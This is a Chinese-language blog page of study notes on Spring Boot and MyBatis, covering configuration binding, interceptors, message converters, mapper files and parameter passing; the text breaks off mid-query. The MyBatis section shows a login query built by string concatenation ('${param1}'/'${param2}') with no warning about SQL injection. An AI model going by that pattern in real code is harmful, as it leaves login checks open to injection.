17 18 /** * 只有在容器中的组件，才会拥有SpringBoot提供的强大功能 */ @Component @ConfigurationProperties(prefix = \u0026#34;person\u0026#34;) public class Person { private String userName; private Boolean boss; private Date birth; private Integer age; private Pet pet; private String[] interests; private List\u0026lt;String\u0026gt; animal; private Map\u0026lt;String, Object\u0026gt; score; private Set\u0026lt;Double\u0026gt; salarys; private Map\u0026lt;String, List\u0026lt;Pet\u0026gt;\u0026gt; allPets; } 法二\n不标注@Component即不需要讲Person类加载到组件中\n这样在需要绑定的时候，标注注解\n1 2 3 4 5 @EnableConfigurationProperties(Person.class) //1、开启Person配置绑定功能 //2、把这个Person这个组件自动注册到容器中 public class MyConfig { } 这个组件的赋值是在配置文件application.properties或application.xml里面找到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 person: birth: 2001/11/1 age: 18 # interests: [篮球,足球] interests: - 篮球 - 足球 animal: [阿毛，阿狗] score: {english:80,shuxue:90} salarys: - 9999.98 - 9999.91 pet: name: cat weight: 99.2 allPets: sick: - {name: 阿狗,weight: 99.99} - name: 阿猫 weight: 88 - name: 阿丢 weight: 22 health: - {name: 阿花,weight:199.22} - {name: 阿水,weight:122.22} user-name: zhangsan boss: true @RestController 1 2 3 4 5 6 7 8 9 10 11 @Target({ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @Documented @Controller @ResponseBody public @interface RestController { @AliasFor( annotation = Controller.class ) String value() default \u0026#34;\u0026#34;; } 实际集成了Controller和ResponseBody 标注了该类是一个组件，并且表明的结果为字符串直接返回到浏览器。 普通参数注解 @PathVariable、@RequestHeader、@ModelAttribute、@RequestParam、@MatrixVariable、@CookieValue、@RequestBody\n这些注解在springmvc中已经了解过，就不在赘述\n1 2 3 4 5 6 7 8 9 10 11 12 // car/2/owner/zhangsan @GetMapping(\u0026#34;/car/{id}/owner/{username}\u0026#34;) public Map\u0026lt;String,Object\u0026gt; getCar(@PathVariable(\u0026#34;id\u0026#34;) Integer id, @PathVariable(\u0026#34;username\u0026#34;) String name, @PathVariable Map\u0026lt;String,String\u0026gt; pv, @RequestHeader(\u0026#34;User-Agent\u0026#34;) String userAgent, @RequestHeader Map\u0026lt;String,String\u0026gt; header, @RequestParam(\u0026#34;age\u0026#34;) Integer age, @RequestParam(\u0026#34;inters\u0026#34;) List\u0026lt;String\u0026gt; inters, @RequestParam Map\u0026lt;String,String\u0026gt; params, @CookieValue(\u0026#34;_ga\u0026#34;) String _ga, @CookieValue(\u0026#34;_ga\u0026#34;) Cookie cookie){ 3 资源放置 静态资源目录\n只要静态资源放在类路径下： called /static(or/publicor/resourcesor/META-INF/resources`\n访问 ： 当前项目根路径/ + 静态资源名\n原理： 静态映射/**。\n请求进来，先去找Controller看能不能处理。不能处理的所有请求又都交给静态资源处理器。静态资源也找不到则响应404页面 配置文件修改\n1 2 3 4 5 6 spring: mvc: static-path-pattern: /res/** # 表示web访问静态资源的路径 resources: static-locations: [classpath:/haha/] # 表示静态资源服务器端访问的路径 自定义 Favicon\n这个只需要将图片命名为favicon.ico ，将其放置在静态资源路径下即可 4 异常处理 默认规则 默认情况下，Spring Boot提供/error处理所有错误的映射 对于机器客户端，它将生成JSON响应，其中包含错误，HTTP状态和异常消息的详细信息。对于浏览器客户端，响应一个“ whitelabel”错误视图，以HTML格式呈现相同的数据 5 常见组件引入 引入json 导入json依赖\n1 2 3 4 5 6 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-json\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.3.4.RELEASE\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;compile\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 导入这个包，返回的值如果为自定义的pojo类型，则容器可以将其处理为json之后返回给客户端\n具体实现流程以后有时间再具体分析 整合Mybatis 导入依赖\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.25\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.baomidou\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-plus-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; mybatis-plus实际上已经整合了mybatis依赖\n配置文件进行配置\n配置数据库\n1 2 3 4 5 6 7 8 9 spring: datasource: url: jdbc:mysql://localhost:3306/mybatis?characterEncoding=utf8\u0026amp;useSSL=false\u0026amp;serverTimezone=UTC\u0026amp;rewriteBatchedStatements=true username: root password: root driver-class-name: com.mysql.cj.jdbc.Driver jdbc: template: query-timeout: 1000 SqlSessionFactory 自动配置好。底层是容器中默认的数据源\nmapperLocations 自动配置好的。\n有默认值。 classpath*:/mapper/**/*.xml；任意包的类路径下的所有mapper文件夹下任意路径下的所有xml都是sql映射文件。 建议以后sql映射文件，放在 mapper下 单元测试 依赖导入\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 使用配置需要标注注解@SpringBootTest\n1 2 3 4 5 6 7 @SpringBootTest class WebAdminApplicationTests { @Test void contextLoads() { } } 常用注解\n**@Test :**表示方法是测试方法。但是与JUnit4的@Test不同，他的职责非常单一不能声明任何属性，拓展的测试将会由Jupiter提供额外测试 **@ParameterizedTest :**表示方法是参数化测试，下方会有详细介绍 **@RepeatedTest :**表示方法可重复执行，下方会有详细介绍 **@DisplayName :**为测试类或者测试方法设置展示名称 **@BeforeEach :**表示在每个单元测试之前执行 **@AfterEach :**表示在每个单元测试之后执行 **@BeforeAll :**表示在所有单元测试之前执行 **@AfterAll :**表示在所有单元测试之后执行 **@Tag :**表示单元测试类别，类似于JUnit4中的@Categories **@Disabled :**表示测试类或测试方法不执行，类似于JUnit4中的@Ignore **@Timeout :**表示测试方法运行如果超过了指定时间将会返回错误 **@ExtendWith :**为测试类或测试方法提供扩展类引用 简单断言\n用来对单个值进行简单的验证。如：\n方法 说明 assertEquals 判断两个对象或两个原始类型是否相等 assertNotEquals 判断两个对象或两个原始类型是否不相等 assertSame 判断两个对象引用是否指向同一个对象 assertNotSame 判断两个对象引用是否指向不同的对象 assertTrue 判断给定的布尔值是否为 true assertFalse 判断给定的布尔值是否为 false assertNull 判断给定的对象引用是否为 null assertNotNull 判断给定的对象引用是否不为 null 6 自定义 标注一个类为configuration 然后在里面重写WebMvcConfigure组件 需要重写哪个功能直接实现重写哪个组件，没有被重写的组件继续使用springboot默认提供的组件 如果加入注解@EnableWebMvc 那么所有的组件都需要重写，不重写等同于没有作用 场景starter - xxxxAutoConfiguration - 导入xxx组件 - 绑定xxxProperties \u0026ndash; 绑定配置文件项 自定义 MessageConverter 实现多协议数据兼容。json、xml、x-reus\n0、**@ResponseBody 响应数据出去 调用 RequestResponseBodyMethodProcessor 处理 1、Processor 处理方法返回值。通过 MessageConverter 处理 2、所有 MessageConverter 合起来可以支持各种媒体类型数据的操作（读、写） 3、内容协商找到最终的 messageConverter； 首先需要实现自定义的messageConverter，继承HttpMessageConver即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class ReusMessageConverter implements HttpMessageConverter\u0026lt;Person\u0026gt; { @Override public boolean canRead(Class\u0026lt;?\u0026gt; clazz, MediaType mediaType) { return false; } @Override public boolean canWrite(Class\u0026lt;?\u0026gt; clazz, MediaType mediaType) { return clazz.isAssignableFrom(Person.class); } @Override public List\u0026lt;MediaType\u0026gt; getSupportedMediaTypes() { return MediaType.parseMediaTypes(\u0026#34;application/x-reus\u0026#34;); } @Override public Person read(Class\u0026lt;? extends Person\u0026gt; clazz, HttpInputMessage inputMessage) throws IOException, HttpMessageNotReadableException { return null; } @Override public void write(Person person, MediaType contentType, HttpOutputMessage outputMessage) throws IOException, HttpMessageNotWritableException { // 自定义数据 String data = person.getUserName()+\u0026#34;;\u0026#34;+person.getAge()+\u0026#34;;\u0026#34;+person.getBirth(); // 写出去 OutputStream body = outputMessage.getBody(); body.write(data.getBytes()); } } 然后在我们的WebMvcConfigure中添加我们的组件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 @Bean public WebMvcConfigurer webMvcConfigurer(){ return new WebMvcConfigurer() { /** * 自定义内容协商策略 * @param configurer */ @Override public void configureContentNegotiation(ContentNegotiationConfigurer configurer) { //Map\u0026lt;String, MediaType\u0026gt; mediaTypes Map\u0026lt;String, MediaType\u0026gt; mediaTypes = new HashMap\u0026lt;\u0026gt;(); mediaTypes.put(\u0026#34;json\u0026#34;,MediaType.APPLICATION_JSON); mediaTypes.put(\u0026#34;xml\u0026#34;,MediaType.APPLICATION_XML); mediaTypes.put(\u0026#34;gg\u0026#34;,MediaType.parseMediaType(\u0026#34;application/x-reus\u0026#34;)); //指定支持解析哪些参数对应的哪些媒体类型 ParameterContentNegotiationStrategy parameterStrategy = new ParameterContentNegotiationStrategy(mediaTypes); // parameterStrategy.setParameterName(\u0026#34;ff\u0026#34;); HeaderContentNegotiationStrategy headeStrategy = new HeaderContentNegotiationStrategy(); configurer.strategies(Arrays.asList(parameterStrategy,headeStrategy)); } // 添加我们自定义的MessageConverter @Override public void extendMessageConverters(List\u0026lt;HttpMessageConverter\u0026lt;?\u0026gt;\u0026gt; converters) { converters.add(new ReusMessageConverter()); } } } 自定义拦截器 以这个检测登录的拦截器为例\n先基于HandlerInterceptor接口编写自己的登录拦截器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 public class LoginInterceptor implements HandlerInterceptor { /** * 目标方法执行之前 * @param request * @param response * @param handler * @return * @throws Exception */ @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String requestURI = request.getRequestURI(); log.info(\u0026#34;preHandle拦截的请求路径是{}\u0026#34;,requestURI); //登录检查逻辑 HttpSession session = request.getSession(); Object loginUser = session.getAttribute(\u0026#34;loginUser\u0026#34;); if(loginUser != null){ //放行 return true; } //拦截住。未登录。跳转到登录页 request.setAttribute(\u0026#34;msg\u0026#34;,\u0026#34;请先登录\u0026#34;); // re.sendRedirect(\u0026#34;/\u0026#34;); request.getRequestDispatcher(\u0026#34;/\u0026#34;).forward(request,response); return false; } /** * 目标方法执行完成以后 * @param request * @param response * @param handler * @param modelAndView * @throws Exception */ @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { log.info(\u0026#34;postHandle执行{}\u0026#34;,modelAndView); } /** * 页面渲染以后 * @param request * @param response * @param handler * @param ex * @throws Exception */ @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { log.info(\u0026#34;afterCompletion执行异常{}\u0026#34;,ex); } } 然后继承WebMvcConfigure\n1 2 3 4 5 6 @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new LoginInterceptor()) .addPathPatterns(\u0026#34;/**\u0026#34;) //所有请求都被拦截包括静态资源 .excludePathPatterns(\u0026#34;/\u0026#34;,\u0026#34;/login\u0026#34;,\u0026#34;/css/**\u0026#34;,\u0026#34;/fonts/**\u0026#34;,\u0026#34;/images/**\u0026#34;,\u0026#34;/js/**\u0026#34;); } 7 开发技巧 Lombok 加入依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.projectlombok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lombok\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 该依赖包的作用是放到创建的对象中，减少了代码的复用。\n@NoArgsConstructor : 无参数构造 @AllArgsConstructor ： 全参数构造 @Data ： 提供get和set方法 @ToString ： 提供toString @EqualsAndHashCode Spring Initailizr（项目初始化向导） 这个是IEDA提供的 在新建module的时候，选择Spring Initializr 选择我们需要加入的组件即可 spring-boot-configuration-processor 这个依赖包加入后，可以支持对application.yaml配置文件的提示功能，便于编写。 Mybatis plus 这个简化了mapper接口和xml的创建和简单增删改查的实现 只需要选中对应的数据库 点击mybatisx-generator,选择相关配置即可。 对应的简单增删改查可以继承BaseMapper\u0026lt;class\u0026gt;类中的方法来实现 ","permalink":"http://www.reus09.top/posts/tech/springboot/","summary":"因为之前接触了一点ssm，所以这里简单的学习了springboot的一些简单用法，具体的源码分析以后有时间的话慢慢分析 这里简单谈一下spri","title":"SpringBoot"},{"content":"MyBatis 这里整理了MyBatis的常见用法 Mybatis 主要对数据库的操作提供了组件 1 环境搭建 导入依赖\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- Mybatis核心 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- MySQL驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.27\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 创建MyBatis的核心配置文件\nmybatis-config.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE configuration PUBLIC \u0026#34;-//mybatis.org//DTD Config 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-config.dtd\u0026#34;\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;!-- 核心配置文件中的标签必须按照固定的顺序(有的标签可以不写，但顺序一定不能乱)： properties、settings、typeAliases、 typeHandlers、objectFactory、 objectWrapperFactory、reflectorFactory、 plugins、environments、databaseIdProvider、 mappers --\u0026gt; \u0026lt;!-- 引入 jdbc的配置文件 --\u0026gt; \u0026lt;properties resource=\u0026#34;jdbc.properties\u0026#34;/\u0026gt; \u0026lt;!-- 设置Mybatis 的全局配置--\u0026gt; \u0026lt;settings\u0026gt; \u0026lt;!--将表中字段的下划线自动转换为驼峰--\u0026gt; \u0026lt;setting name=\u0026#34;mapUnderscoreToCamelCase\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;!--开启延迟加载--\u0026gt; \u0026lt;setting name=\u0026#34;lazyLoadingEnabled\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; \u0026lt;!-- 设置类型别名--\u0026gt; \u0026lt;typeAliases\u0026gt; \u0026lt;!--typeAlias 设置类型别名 type alias : 设置某个类型的别名，不区分大小写，如果没有设置，则存在一个固定的类名 --\u0026gt; \u0026lt;!-- \u0026lt;typeAlias type=\u0026#34;com.reus.mybatis.pojo.User\u0026#34; alias = \u0026#34;User\u0026#34;\u0026gt;\u0026lt;/typeAlias\u0026gt;--\u0026gt; \u0026lt;!-- 以包为单位 ，将包下的所有数据设置为默认的类型别名，即类名不区分带大小写 --\u0026gt; \u0026lt;package name=\u0026#34;com.reus.mybatis.pojo\u0026#34;/\u0026gt; \u0026lt;/typeAliases\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;!--设置分页插件--\u0026gt; \u0026lt;plugin interceptor=\u0026#34;com.github.pagehelper.PageInterceptor\u0026#34;\u0026gt;\u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;!-- environments:配置多个 数据库的环境 属性： default: 默认使用的环境的Id --\u0026gt; \u0026lt;environments default=\u0026#34;development\u0026#34;\u0026gt; \u0026lt;!-- 配置具体的环境 属性: id, 唯一标识 asd --\u0026gt; \u0026lt;environment id=\u0026#34;development\u0026#34;\u0026gt; \u0026lt;!-- transactionManager: 设置事务管理方式 JDBC 当前环境执行sql时，使用JDBC原生的事务管理方式，事务的提交和回滚需要手动处理 MANAGED ： 被Spring管理 --\u0026gt; \u0026lt;transactionManager type=\u0026#34;JDBC\u0026#34;/\u0026gt; \u0026lt;!--制定 数据源 Type: 数据类型 POOLED 数据库使用缓存数据库连接 UNPOOLED 不使用数据库连接池 JNDI 使用上下文中的数据源 --\u0026gt; \u0026lt;dataSource type=\u0026#34;POOLED\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;driver\u0026#34; value=\u0026#34;${jdbc.driver}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;url\u0026#34; value=\u0026#34;${jdbc.url}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;username\u0026#34; value=\u0026#34;${jdbc.username}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;password\u0026#34; value=\u0026#34;${jdbc.password}\u0026#34;/\u0026gt; \u0026lt;/dataSource\u0026gt; \u0026lt;/environment\u0026gt; \u0026lt;/environments\u0026gt; \u0026lt;!--引入映射文件--\u0026gt; \u0026lt;mappers\u0026gt; \u0026lt;!-- \u0026lt;mapper resource=\u0026#34;mappers/UserMapper.xml\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- 以包为单位引入映射文件 要求 1、mapper接口所在的包要和映射文件所在的包一致 2、mapper接口要和映射文件的名字一致 --\u0026gt; \u0026lt;package name=\u0026#34;com.reus.mybatis.mapper\u0026#34;/\u0026gt; \u0026lt;/mappers\u0026gt; \u0026lt;/configuration\u0026gt; 2 具体配置及调用 创建mapper接口\nMyBatis中的mapper接口相当于以前的dao。但是区别在于，mapper仅仅是接口，我们不需要提供实现类\n1 2 3 4 5 6 7 8 package com.reus.mybatis.mapper; public interface UserMapper { /** * 添加用户信息 */ int insertUser(); } 创建对应的Mybatis映射文件\n相关概念：ORM（Object Relationship Mapping）对象关系映射。 对象：Java的实体类对象 关系：关系型数据库 映射：二者之间的对应关系 Java概念 数据库概念 类 表 属性 字段/列 对象 记录/行 映射文件的命名规则 表所对应的实体类的类名+Mapper.xml 例如：表t_user，映射的实体类为User，所对应的映射文件为UserMapper.xml 因此一个映射文件对应一个实体类，对应一张表的操作 MyBatis映射文件用于编写SQL，访问以及操作表中的数据 MyBatis映射文件存放的位置是src/main/resources/mappers目录下 MyBatis中可以面向接口操作数据，要保证两个一致 mapper接口的全类名和映射文件的命名空间（namespace）保持一致 mapper接口中方法的方法名和映射文件中编写SQL的标签的id属性保持一致 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE mapper PUBLIC \u0026#34;-//mybatis.org//DTD Mapper 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-mapper.dtd\u0026#34;\u0026gt; \u0026lt;mapper namespace=\u0026#34;com.reus.mybatis.mapper.UserMapper\u0026#34;\u0026gt; \u0026lt;!--int insertUser();--\u0026gt; \u0026lt;insert id=\u0026#34;insertUser\u0026#34;\u0026gt; insert into t_user values(null,\u0026#39;张三\u0026#39;,\u0026#39;123\u0026#39;,23,\u0026#39;女\u0026#39;,\u0026#39;123@qq.com\u0026#39;) \u0026lt;/insert\u0026gt; \u0026lt;!--updateUser--\u0026gt; \u0026lt;update id=\u0026#34;updateUser\u0026#34;\u0026gt; update t_user set username = \u0026#39;李四\u0026#39; where id = 4 \u0026lt;/update\u0026gt; \u0026lt;!--void deleteUser();--\u0026gt; \u0026lt;delete id=\u0026#34;deleteUser\u0026#34;\u0026gt; delete from t_user where id = 4 \u0026lt;/delete\u0026gt; \u0026lt;!--User getUserById(); 必须设置对应的标签 resultType 和 resultMap resultType : 设置默认的映射关系 resultMap: 设置自定义的映射关系 --\u0026gt; \u0026lt;select id=\u0026#34;getUserById\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where id = 3 \u0026lt;/select\u0026gt; \u0026lt;!--List\u0026lt;User\u0026gt; getAllUser(); --\u0026gt; \u0026lt;select id=\u0026#34;getAllUser\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user; \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; 获取配置中的信息\n运用SqlsessionFactory 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class UserMapperTest { @Test public void testInsertUser() throws IOException { //读取MyBatis的核心配置文件 InputStream is = Resources.getResourceAsStream(\u0026#34;mybatis-config.xml\u0026#34;); //获取SqlSessionFactoryBuilder对象 SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder(); //通过核心配置文件所对应的字节输入流创建工厂类SqlSessionFactory，生产SqlSession对象 SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is); //获取sqlSession，此时通过SqlSession对象所操作的sql都必须手动提交或回滚事务 //SqlSession sqlSession = sqlSessionFactory.openSession(); //创建SqlSession对象，此时通过SqlSession对象所操作的sql都会自动提交 SqlSession sqlSession = sqlSessionFactory.openSession(true); //通过代理模式创建UserMapper接口的代理实现类对象 UserMapper userMapper = sqlSession.getMapper(UserMapper.class); //调用UserMapper接口中的方法，就可以根据UserMapper的全类名匹配元素文件，通过调用的方法名匹配映射文件中的SQL标签，并执行标签中的SQL语句 int result = userMapper.insertUser(); //提交事务 //sqlSession.commit(); System.out.println(\u0026#34;result:\u0026#34; + result); } } 3 获取参数 MyBatis获取参数值的两种方式：${}和#{} ${}的本质就是字符串拼接，#{}的本质就是占位符赋值 ${}使用字符串拼接的方式拼接sql，若为字符串类型或日期类型的字段进行赋值时，需要手动加单引号；但是#{}使用占位符赋值的方式拼接sql，此时为字符串类型或日期类型的字段进行赋值时，可以自动添加单引号 3.1 单个字面量类型数据 单个字面量类型数据\n若mapper接口中的方法参数为单个的字面量类型，此时可以使用${}和#{}以任意的名称（最好见名识意）获取参数的值，注意${}需要手动加单引号 1 2 3 4 5 6 7 8 9 \u0026lt;!--User getUserByUsername(String username);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByUsername\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{username} \u0026lt;/select\u0026gt; \u0026lt;!--User getUserByUsername(String username);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByUsername\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = \u0026#39;${username}\u0026#39; \u0026lt;/select\u0026gt; 3.2 多个个字面量类型数据 多个字面量类型的参数\n若mapper接口中的方法参数为多个时，此时MyBatis会自动将这些参数放在一个map集合中\n1 2 1. 以arg0,arg1...为键，以参数为值； 2. 以param1,param2...为键，以参数为值； 因此只需要通过\\${}和#{}访问map集合的键就可以获取相对应的值，注意${}需要手动加单引号。\n使用arg或者param都行，要注意的是，arg是从arg0开始的，param是从param1开始的\n1 2 3 4 5 6 7 8 9 \u0026lt;!--User checkLogin(String username,String password);--\u0026gt; \u0026lt;select id=\u0026#34;checkLogin\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{arg0} and password = #{arg1} \u0026lt;/select\u0026gt; \u0026lt;!--User checkLogin(String username,String password);--\u0026gt; \u0026lt;select id=\u0026#34;checkLogin\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = \u0026#39;${param1}\u0026#39; and password = \u0026#39;${param2}\u0026#39; \u0026lt;/select\u0026gt; 3.3 map集合类型的参数 若mapper接口中的方法需要的参数为多个时，此时可以手动创建map集合，将这些数据放在map中只需要通过\\${}和#{}访问map集合的键就可以获取相对应的值，注意${}需要手动加单引号\n即手动创建一个map集合，作为参数传递给配置，配置中即可使用map来获取数据 1 2 3 4 \u0026lt;!--User checkLoginByMap(Map\u0026lt;String,Object\u0026gt; map);--\u0026gt; \u0026lt;select id=\u0026#34;checkLoginByMap\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{username} and password = #{password} \u0026lt;/select\u0026gt; 1 2 3 4 5 6 7 8 9 10 @Test public void checkLoginByMap() { SqlSession sqlSession = SqlSessionUtils.getSqlSession(); ParameterMapper mapper = sqlSession.getMapper(ParameterMapper.class); Map\u0026lt;String,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;usermane\u0026#34;,\u0026#34;admin\u0026#34;); map.put(\u0026#34;password\u0026#34;,\u0026#34;123456\u0026#34;); User user = mapper.checkLoginByMap(map); System.out.println(user); } 3.4 实体类类型的参数 若mapper接口中的方法参数为实体类对象时此时可以使用\\${}和#{}，通过访问实体类对象中的属性名获取属性值，注意${}需要手动加单引号\n这是应为一个类型中的参数名相当与map 中的key 1 2 3 4 \u0026lt;!--int insertUser(User user);--\u0026gt; \u0026lt;insert id=\u0026#34;insertUser\u0026#34;\u0026gt; insert into t_user values(null,#{username},#{password},#{age},#{sex},#{email}) \u0026lt;/insert\u0026gt; 1 2 3 4 5 6 7 @Test public void insertUser() { SqlSession sqlSession = SqlSessionUtils.getSqlSession(); ParameterMapper mapper = sqlSession.getMapper(ParameterMapper.class); User user = new User(null,\u0026#34;Tom\u0026#34;,\u0026#34;123456\u0026#34;,12,\u0026#34;男\u0026#34;,\u0026#34;123@321.com\u0026#34;); mapper.insertUser(user); } 3.5 使用@Param标识参数 可以通过@Param注解标识mapper接口中的方法参数，此时，会将这些参数放在map集合中\n1 2 3 4 \u0026lt;!--User CheckLoginByParam(@Param(\u0026#34;username\u0026#34;) String username, @Param(\u0026#34;password\u0026#34;) String password);--\u0026gt; \u0026lt;select id=\u0026#34;CheckLoginByParam\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; select * from t_user where username = #{username} and password = #{password} \u0026lt;/select\u0026gt; 4 各种查询 如果查询出的数据只有一条，可以通过\n实体类对象接收 List集合接收 Map集合接收，结果{password=123456, sex=男, id=1, age=23, username=admin} 如果查询出的数据有多条，一定不能用实体类对象接收，会抛异常TooManyResultsException，可以通过\n实体类类型的LIst集合接收 Map类型的LIst集合接收 在mapper接口的方法上添加@MapKey注解 因为查询数据只有一条较为简单，就不在赘述，这里只讲一下多条数据的情况\n多条数据\n法一\n查询结果为一个map的list集合 1 2 3 4 5 6 /** * 查询所有用户信息为map集合 * @return * 将表中的数据以map集合的方式查询，一条数据对应一个map；若有多条数据，就会产生多个map集合，此时可以将这些map放在一个list集合中获取 */ List\u0026lt;Map\u0026lt;String, Object\u0026gt;\u0026gt; getAllUserToMap(); 1 2 3 4 5 6 7 8 9 10 \u0026lt;!--Map\u0026lt;String, Object\u0026gt; getAllUserToMap();--\u0026gt; \u0026lt;select id=\u0026#34;getAllUserToMap\u0026#34; resultType=\u0026#34;map\u0026#34;\u0026gt; select * from t_user \u0026lt;/select\u0026gt; \u0026lt;!-- 结果： [{password=123456, sex=男, id=1, age=23, username=admin}, {password=123456, sex=男, id=2, age=23, username=张三}, {password=123456, sex=男, id=3, age=23, username=张三}] --\u0026gt; 法二\n根据@MapKey指定一个主键 1 2 3 4 5 6 7 /** * 查询所有用户信息为map集合 * @return * 将表中的数据以map集合的方式查询，一条数据对应一个map；若有多条数据，就会产生多个map集合，并且最终要以一个map的方式返回数据，此时需要通过@MapKey注解设置map集合的键，值是每条数据所对应的map集合 */ @MapKey(\u0026#34;id\u0026#34;) Map\u0026lt;String, Object\u0026gt; getAllUserToMap(); 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!--Map\u0026lt;String, Object\u0026gt; getAllUserToMap();--\u0026gt; \u0026lt;select id=\u0026#34;getAllUserToMap\u0026#34; resultType=\u0026#34;map\u0026#34;\u0026gt; select * from t_user \u0026lt;/select\u0026gt; \u0026lt;!-- 结果： { 1={password=123456, sex=男, id=1, age=23, username=admin}, 2={password=123456, sex=男, id=2, age=23, username=张三}, 3={password=123456, sex=男, id=3, age=23, username=张三} } --\u0026gt; 5 特殊SQL的执行 5.1 模糊查询 1 2 3 4 5 6 7 /** * 根据用户名进行模糊查询 * @param username * @return java.util.List\u0026lt;com.atguigu.mybatis.pojo.User\u0026gt; * @date 2022/2/26 21:56 */ List\u0026lt;User\u0026gt; getUserByLike(@Param(\u0026#34;username\u0026#34;) String username); 1 2 3 4 5 6 \u0026lt;!--List\u0026lt;User\u0026gt; getUserByLike(@Param(\u0026#34;username\u0026#34;) String username);--\u0026gt; \u0026lt;select id=\u0026#34;getUserByLike\u0026#34; resultType=\u0026#34;User\u0026#34;\u0026gt; \u0026lt;!--select * from t_user where username like 